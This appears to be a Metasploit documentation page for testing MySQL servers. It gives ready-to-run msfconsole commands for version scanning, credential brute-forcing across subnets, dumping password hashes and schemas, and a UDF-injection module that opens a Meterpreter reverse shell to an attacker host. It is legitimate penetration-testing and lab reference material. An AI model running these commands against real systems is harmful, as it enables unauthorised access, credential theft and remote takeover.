## MySQL

MySQL is frequently found on port 3306/TCP. It is an open-source relational database management system.

Metasploit has support for multiple MySQL modules, including:

- Version enumeration
- Verifying/bruteforcing credentials
- Dumping database information
- Executing arbitrary queries against the database
- Executing arbitrary SQL queries against the database
- Gaining reverse shells

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:

```
msf6 > search mysql
```

### Lab Environment

When testing in a lab environment MySQL can either be installed on the host machine or within Docker:

```
docker run -it --rm -e MYSQL_ROOT_PASSWORD=' a b c p4$$w0rd' -p 3306:3306 mariadb:latest
```

### MySQL Enumeration

Enumerate version:

```
use auxiliary/scanner/mysql/mysql_version
run mysql://127.0.0.1
```

### MySQL Login / Bruteforce

If you have MySQL credentials to validate:

```
use auxiliary/scanner/mysql/mysql_login
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

Re-using MySQL credentials in a subnet:

```
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use auxiliary/scanner/mysql/mysql_login
run mysql://user:pass@192.168.123.6:2222
```

Brute-force host with known user and password list:

```
use auxiliary/scanner/mysql/mysql_login
run mysql://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials:

```
use auxiliary/scanner/mysql/mysql_login
run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:

```
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

### MySQL Dumping

User and hash dump:

```
use auxiliary/scanner/mysql/mysql_hashdump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

Schema dump:

```
use auxiliary/scanner/mysql/mysql_schemadump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

### MySQL Querying

Execute raw SQL:

```
use admin/mysql/mysql_sql
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' sql='select version()'
```

### MySQL Reverse Shell

This module creates and enables a custom UDF (user defined function) on the target host via the `SELECT ... into DUMPFILE` method of binary injection. On default Microsoft Windows installations of MySQL (=< 5.5.9), directory write permissions not enforced, and the MySQL service runs as LocalSystem.

For this to work successfully:

1. `secure_file_priv`, a mysql setting, must be changed from the default to allow writing to MySQL's plugins folder
2. On Ubuntu, apparmor needs a bunch of exceptions added, or to be disabled. Equivalents on other linux systems most likely need the same
3. The MySQL plugin folder must be writable

NOTE: This module will leave a payload executable on the target system when the attack is finished, as well as the UDF DLL, and will define or redefine `sys_eval()` and `sys_exec()` functions. Usage:

```
use multi/mysql/mysql_udf_payload
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' lhost=192.168.123.1 target=Linux payload=linux/x86/meterpreter/reverse_tcp
```
